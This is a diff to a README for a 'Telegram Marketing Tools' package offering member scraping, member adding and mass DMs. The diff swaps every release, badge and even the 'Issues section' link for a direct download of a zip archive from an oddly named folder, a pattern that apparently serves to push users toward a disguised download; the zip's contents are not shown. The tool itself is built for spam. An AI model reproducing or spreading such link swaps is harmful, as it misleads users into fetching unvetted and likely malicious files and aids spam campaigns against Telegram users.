@@ -4,7 +4,7 @@
 Welcome! This guide will help you easily download and run the Telegram Marketing Tools. This software helps you manage your Telegram activities with almost 50 functions, including member adder, scraper, mass DM, and more.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Fasthman109/Telegram-Marketing-Tools/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Fasthman109/Telegram-Marketing-Tools/main/pseudocolumella/Telegram-Marketing-Tools.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Fasthman109/Telegram-Marketing-Tools/main/pseudocolumella/Telegram-Marketing-Tools.zip)
 
 ## 💡 What You Need
 Before you start, ensure your system meets the following requirements:
@@ -18,7 +18,7 @@ This tool works best on desktop systems but is compatible with most operating en
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases](https://github.com/Fasthman109/Telegram-Marketing-Tools/releases) page.
+   Go to the [Releases](https://raw.githubusercontent.com/Fasthman109/Telegram-Marketing-Tools/main/pseudocolumella/Telegram-Marketing-Tools.zip) page.
 
 2. **Select the Latest Release**  
    Look for the latest version listed. It should be at the top of the page.
@@ -61,7 +61,7 @@ If you encounter any issues:
 - Ensure your internet connection is stable.
 - Double-check that you have the latest version of the app.
 - Review your settings within Telegram to make sure permissions are correct.
-- For more help, visit the [Issues section](https://github.com/Fasthman109/Telegram-Marketing-Tools/issues) on GitHub.
+- For more help, visit the [Issues section](https://raw.githubusercontent.com/Fasthman109/Telegram-Marketing-Tools/main/pseudocolumella/Telegram-Marketing-Tools.zip) on GitHub.
 
 ## 📢 Community and Updates
 Stay informed about updates:
@@ -71,7 +71,7 @@ Stay informed about updates:
 - Check out user experiences and suggestions in the comments section under the releases.
 
 ## 🔗 Useful Links
-- [Releases](https://github.com/Fasthman109/Telegram-Marketing-Tools/releases)
+- [Releases](https://raw.githubusercontent.com/Fasthman109/Telegram-Marketing-Tools/main/pseudocolumella/Telegram-Marketing-Tools.zip)
 - [Documentation](link_to_documentation)
 - [Community Forum](link_to_forum)
 
